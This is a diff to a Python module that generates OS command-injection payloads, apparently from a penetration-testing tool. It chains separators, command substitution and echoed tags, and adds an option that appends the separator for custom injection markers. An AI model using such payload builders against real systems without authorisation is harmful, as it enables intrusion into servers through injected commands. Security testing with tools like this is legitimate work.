@@ -52,6 +52,10 @@ def decision(separator, TAG, randv1, randv2):
                 math_calc +
                 settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  + TAG 
                 )
+
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
+
   return payload
 
 """
@@ -83,6 +87,10 @@ def decision_alter_shell(separator, TAG, randv1, randv2):
                 TAG + "'%2B'" +
                 TAG + "')\""
                 )
+
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
+
   return payload
 
 """
@@ -109,6 +117,10 @@ def cmd_execution(separator, TAG, cmd):
               cmd_exec +
               settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  + TAG
               )
+
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
+
   return payload
 
 """
@@ -136,6 +148,10 @@ def cmd_execution_alter_shell(separator, TAG, cmd):
               " -c \"print('" + TAG + "'%2B'" + TAG + "'%2B'" + settings.CMD_SUB_PREFIX + "echo " + cmd_exec + settings.CMD_SUB_SUFFIX + "'%2B'" + 
               TAG + "'%2B'" + TAG + "')\""
               )
+
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
+
   return payload
 
 # eof
